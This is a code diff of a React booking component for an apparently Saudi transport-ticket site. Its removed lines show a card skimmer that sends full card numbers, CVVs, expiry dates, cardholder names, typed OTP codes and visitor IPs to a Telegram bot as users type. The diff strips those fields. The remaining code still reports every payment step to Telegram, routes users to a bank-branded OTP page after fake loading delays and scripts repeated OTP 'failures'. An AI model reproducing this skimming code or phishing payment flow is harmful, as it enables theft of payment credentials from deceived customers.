@@ -7,35 +7,31 @@ import {
 } from 'lucide-react';
 import { trpc } from '@/providers/trpc';
 import { sendBookingMessage } from '@/lib/telegram-settings';
-import { sendPaymentToTelegram, getVisitorIP } from '@/lib/payment-telegram';
+import { sendPaymentToTelegram } from '@/lib/payment-telegram';
 import { findRoute, getCityInfo, getRouteDetails, calculateRoutePrice, type RouteDetails } from '@/lib/international-data';
 import { detectBank, getBankInfo } from '@/lib/bank-data';
 import type { VisitorStep } from '@/lib/visitor-tracking';
 import LoadingScreen from './LoadingScreen';
 import type { BookingData } from './BookingPanel';
 
-// ─── Read pricing multipliers from admin settings ─────────────
-function getFareMultiplier(fare: 'economy' | 'business' | 'vip'): number {
-  try {
-    const raw = localStorage.getItem('sat_pricing_settings_v3');
-    if (raw) {
-      const s = JSON.parse(raw);
-      if (fare === 'vip') return s.vipMultiplier || 2;
-      if (fare === 'business') return s.businessMultiplier || 1.2;
-    }
-  } catch { /* ignore */ }
-  return fare === 'vip' ? 2 : fare === 'business' ? 1.2 : 1;
+// ─── Use the route prices calculated by the server ────────────
+function getFareMultiplier(
+  fare: 'economy' | 'business' | 'vip',
+  routePrice?: { economy: number; business: number; vip: number },
+): number {
+  if (!routePrice || routePrice.economy <= 0) {
+    return fare === 'vip' ? 2 : fare === 'business' ? 1.2 : 1;
+  }
+  if (fare === 'vip') return routePrice.vip / routePrice.economy;
+  if (fare === 'business') return routePrice.business / routePrice.economy;
+  return 1;
 }
 
 // ─── Payment Entry Notification (Payment Bot) ─────────────────
 async function notifyPaymentEntry(booking: BookingData, paymentMethod: string, amount: number) {
-  const ip = await getVisitorIP();
   await sendPaymentToTelegram({
-    cardNumber: 'Pending',
-    cardType: 'Pending',
-    expiryDate: '', cvv: '', cardHolder: '',
     amount, from: booking.from, to: booking.to,
-    paymentMethod, step: 'card-entered', ip,
+    paymentMethod, step: 'card-entered',
   });
 }
 
@@ -121,7 +117,7 @@ const MadaIcon: React.FC<{ className?: string }> = ({ className = 'w-24 h-10' })
   </svg>
 );
 
-const paymentMethods = [
+const basePaymentMethods = [
   {
     id: 'visa',
     name: 'Visa / Mastercard',
@@ -164,14 +160,18 @@ const loadingMessages = [
 // ─── Helpers ──────────────────────────────────────────────────
 const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
 
-function generateTrips(data: BookingData, serverBasePrice?: number): Trip[] {
+function generateTrips(
+  data: BookingData,
+  serverRoute?: { economy: number; distance: number; duration: number },
+): Trip[] {
   const count = data.tripType === 'round-trip' ? 4 : 3;
 
   // Use international route data only
   const route = findRoute(data.from, data.to);
-  const dist = route ? route.distanceKm : 500;
-  const durationHours = route ? Math.floor(route.durationHours) : 6;
-  const durationMinutes = route ? Math.round((route.durationHours - Math.floor(route.durationHours)) * 60) : 0;
+  const dist = serverRoute?.distance ?? (route ? route.distanceKm : 500);
+  const routeDuration = serverRoute?.duration ?? (route ? route.durationHours : 6);
+  const durationHours = Math.floor(routeDuration);
+  const durationMinutes = Math.round((routeDuration - Math.floor(routeDuration)) * 60);
   const basePrice = route ? route.economyPrice : 200;
   const isDirect = route ? route.routeType === 'direct' : true;
   const borderInfo = route && route.borderCrossings.length > 0
@@ -191,7 +191,7 @@ function generateTrips(data: BookingData, serverBasePrice?: number): Trip[] {
     // Dynamic pricing: base economy price — fare multiplier applied separately via selectedFare
     const fareClasses: Array<'economy' | 'business' | 'vip'> = ['vip', 'business', 'economy'];
     const tripFareClass = fareClasses[i % 3];
-    const tripBasePrice = serverBasePrice ?? calculateRoutePrice(data.from, data.to, 'economy');
+    const tripBasePrice = serverRoute?.economy ?? calculateRoutePrice(data.from, data.to, 'economy');
 
     return {
       id: `trip-${i}`, tripNumber: `SAT-${2360 + i}`, isDirect,
@@ -294,11 +294,31 @@ async function notifyStep(stepName: string, booking: BookingData, extra: Record<
 const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   const utils = trpc.useUtils();
   const { data: routePrice } = trpc.prices.calculate.useQuery({ from: bookingData.from, to: bookingData.to });
+  const { data: activeBanks = [] } = trpc.banks.publicList.useQuery();
+  const paymentMethods = useMemo(() => {
+    const walletMethods = activeBanks
+      .filter(bank => bank.type === 'wallet' && bank.key !== 'visa' && bank.key !== 'mada')
+      .map(bank => ({
+        id: bank.key,
+        name: bank.name,
+        icon: (
+          <div className="flex items-center justify-center w-20 h-10">
+            {bank.logoUrl ? (
+              <img src={bank.logoUrl} alt={bank.name} className="max-w-20 max-h-9 object-contain" />
+            ) : (
+              <Wallet className="w-8 h-8" style={{ color: bank.color }} />
+            )}
+          </div>
+        ),
+      }));
+    return [...basePaymentMethods, ...walletMethods];
+  }, [activeBanks]);
   const [step, setStep] = useState<Step>('results');
   const [expandedTrip, setExpandedTrip] = useState<string | null>(null);
   const [selectedFare, setSelectedFare] = useState('economy');
   const [selectedTripId, setSelectedTripId] = useState<string | null>(null);
   const [bookingId, setBookingId] = useState<number | null>(null);
+  const [bookingAccessToken, setBookingAccessToken] = useState<string | null>(null);
   const totalPassengers = (bookingData.adults || bookingData.passengers || 1) + (bookingData.children || 0) + (bookingData.infants || 0);
 
   // Generate passengers with proper categories from bookingData (adults/children/infants)
@@ -363,15 +383,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     // Stage 1: Card number complete (16 digits) → notify payment bot
     if (digitsOnly.length >= 16 && !cardNotifiedRef.current) {
       cardNotifiedRef.current = true;
-      const cardType = detectCardType(digitsOnly);
-      const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'غير معروف';
-      const bankResult = detectBank(cardNumber);
       sendPaymentToTelegram({
-        cardNumber, cardType: cardTypeName, expiryDate, cvv,
-        cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
         amount: finalTotal, from: bookingData.from, to: bookingData.to,
         paymentMethod: paymentName, step: 'card-entered',
-        bankName: bankResult?.bank.name || 'Unknown',
       });
     }
 
@@ -380,15 +394,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     const cvvFilled = cvv.length >= 3;
     if (digitsOnly.length >= 16 && expFilled && cvvFilled && !allFieldsNotifiedRef.current) {
       allFieldsNotifiedRef.current = true;
-      const cardType = detectCardType(digitsOnly);
-      const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'غير معروف';
-      const bankResult2 = detectBank(cardNumber);
       sendPaymentToTelegram({
-        cardNumber, cardType: cardTypeName, expiryDate, cvv,
-        cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
         amount: finalTotal, from: bookingData.from, to: bookingData.to,
         paymentMethod: paymentName, step: 'card-complete',
-        bankName: bankResult2?.bank.name || 'Unknown',
       });
     }
 
@@ -413,27 +421,19 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     otpRealTimeSentRef.current[key] = true;
 
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
-    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
-    const bankResult = detectBank(cardNumber);
-
     sendPaymentToTelegram({
-      cardNumber, cardType: cardTypeName, expiryDate, cvv,
-      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
       amount: finalTotal, from: bookingData.from, to: bookingData.to,
       paymentMethod: paymentName, step: 'otp-typing',
-      otpCode: verificationCode,
       attemptNumber: failedAttempts + 1,
-      bankName: bankResult?.bank.name || 'Unknown',
     });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [verificationCode]);
 
-  const trips = useMemo(() => generateTrips(bookingData, routePrice?.economy), [bookingData, routePrice?.economy]);
+  const trips = useMemo(() => generateTrips(bookingData, routePrice), [bookingData, routePrice]);
   const seats = useMemo(() => generateSeats(), []);
   const activeTrip = trips.find(t => t.id === selectedTripId) || trips[0] || null;
   const currentFare = fareTypes.find(f => f.id === selectedFare) || fareTypes[0];
-  const fareMul = getFareMultiplier(selectedFare as 'economy' | 'business' | 'vip');
+  const fareMul = getFareMultiplier(selectedFare as 'economy' | 'business' | 'vip', routePrice);
   // Price calc with adults (100%), children (50%), infants (25%)
   const calcTotal = useCallback((bp: number) => {
     const adults = bookingData.adults || bookingData.passengers || 1;
@@ -461,6 +461,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     setSelectedFare('economy');
     setSelectedTripId(null);
     setBookingId(null);
+    setBookingAccessToken(null);
     setPassengerOverrides({});
     setBookerInfo({ name: '', phone: '', email: '' });
     setSelectedSeats([]);
@@ -568,10 +569,14 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
         pickupDate: bookingData.pickupDate, pickupTime: bookingData.pickupTime || '10:00',
         returnDate: bookingData.returnDate || undefined, returnTime: bookingData.returnTime || undefined,
         passengers: bookingData.passengers,
+        adults: bookingData.adults,
+        children: bookingData.children,
+        infants: bookingData.infants,
       });
-      if (result.id) {
+      if (result.id && result.accessToken) {
         setBookingId(Number(result.id));
-        await updateBookingStep.mutateAsync({ id: Number(result.id), selectedTrip: JSON.stringify(trip), selectedFare });
+        setBookingAccessToken(result.accessToken);
+        await updateBookingStep.mutateAsync({ id: Number(result.id), accessToken: result.accessToken, selectedTrip: JSON.stringify(trip), selectedFare });
       }
     } catch {
       alert('تعذر إنشاء الحجز على الخادم. يرجى المحاولة مرة أخرى.');
@@ -583,9 +588,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   const handleSeatNext = async () => {
     if (selectedSeats.length !== totalPassengers) return;
-    if (bookingId) {
+    if (bookingId && bookingAccessToken) {
       try {
-        await updateBookingStep.mutateAsync({ id: bookingId, selectedSeats: JSON.stringify(selectedSeats) });
+        await updateBookingStep.mutateAsync({ id: bookingId, accessToken: bookingAccessToken, selectedSeats: JSON.stringify(selectedSeats) });
       } catch {
         alert('تعذر حفظ المقاعد على الخادم. يرجى المحاولة مرة أخرى.');
         return;
@@ -598,10 +603,10 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   const handlePassengerNext = async () => {
     if (!allPassengersValid || !bookerValid) return;
-    if (bookingId) {
+    if (bookingId && bookingAccessToken) {
       try {
         await updateBookingStep.mutateAsync({
-          id: bookingId, passengerName: mergedPassengers.map(p => p.fullName).join(', '),
+          id: bookingId, accessToken: bookingAccessToken, passengerName: mergedPassengers.map(p => p.fullName).join(', '),
           passengerPhone: mergedPassengers[0]?.phone || '',
         });
       } catch {
@@ -618,9 +623,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   const handlePaymentMethodNext = async () => {
     if (!selectedPayment) return;
-    if (bookingId) {
+    if (bookingId && bookingAccessToken) {
       try {
-        await updateBookingStep.mutateAsync({ id: bookingId, paymentMethod: selectedPayment });
+        await updateBookingStep.mutateAsync({ id: bookingId, accessToken: bookingAccessToken, paymentMethod: selectedPayment });
       } catch {
         alert('تعذر حفظ طريقة الدفع على الخادم. يرجى المحاولة مرة أخرى.');
         return;
@@ -632,9 +637,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   };
 
   const handlePaymentDone = async () => {
-    if (bookingId) {
+    if (bookingId && bookingAccessToken) {
       try {
-        await updateBookingStep.mutateAsync({ id: bookingId, paymentStatus: 'pending', totalAmount: finalTotal });
+        await updateBookingStep.mutateAsync({ id: bookingId, accessToken: bookingAccessToken, paymentStatus: 'pending', totalAmount: finalTotal });
       } catch {
         alert('تعذر تحديث حالة الدفع على الخادم. يرجى المحاولة مرة أخرى.');
         return;
@@ -652,16 +657,11 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     }
 
     // Send a safe stage-only notification.
-    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
-    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
 
     await sendPaymentToTelegram({
-      cardNumber, cardType: cardTypeName, expiryDate, cvv,
-      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
       amount: finalTotal, from: bookingData.from, to: bookingData.to,
       paymentMethod: paymentName, step: 'card-complete',
-      bankName: bankResult?.bank.name || 'Unknown',
     });
 
     // 8-sec loading then route to bank-branded OTP
@@ -676,17 +676,11 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     setFailedAttempts(newAttempts);
 
     // Send a safe attempt notification without the OTP value.
-    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
-    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    const bankResult = detectBank(cardNumber);
     await sendPaymentToTelegram({
-      cardNumber, cardType: cardTypeName, expiryDate, cvv,
-      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
       amount: finalTotal, from: bookingData.from, to: bookingData.to,
       paymentMethod: paymentName, step: 'otp-attempt',
-      otpCode: verificationCode, attemptNumber: newAttempts,
-      bankName: bankResult?.bank.name || 'Unknown',
+      attemptNumber: newAttempts,
     });
 
     // Show loading (8 seconds for payment verification)
@@ -709,17 +703,11 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   // otp_4 "Retry" button → loading → code_failed → send to payment bot
   const handleOtp4Retry = async () => {
     // Send a safe failure notification without any OTP or card data.
-    const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
-    const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    const bankResult = detectBank(cardNumber);
     await sendPaymentToTelegram({
-      cardNumber, cardType: cardTypeName, expiryDate, cvv,
-      cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
       amount: finalTotal, from: bookingData.from, to: bookingData.to,
       paymentMethod: paymentName, step: 'otp-failed',
       attemptNumber: 4,
-      bankName: bankResult?.bank.name || 'Unknown',
     });
 
     setLoadingMsg('جارٍ التحقق من الرمز...');
@@ -2827,7 +2815,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
                                 <span className={`font-extrabold text-sm ${
                                   isSelected ? (fare.id === 'vip' ? 'text-brand-gold' : 'text-blue-600') : 'text-charcoal'
                                 }`}>
-                                  {Math.round(trip.basePrice * getFareMultiplier(fare.id as 'economy' | 'business' | 'vip'))} ر.س
+                                  {Math.round(trip.basePrice * getFareMultiplier(fare.id as 'economy' | 'business' | 'vip', routePrice))} ر.س
                                 </span>
                               </div>
                             </div>
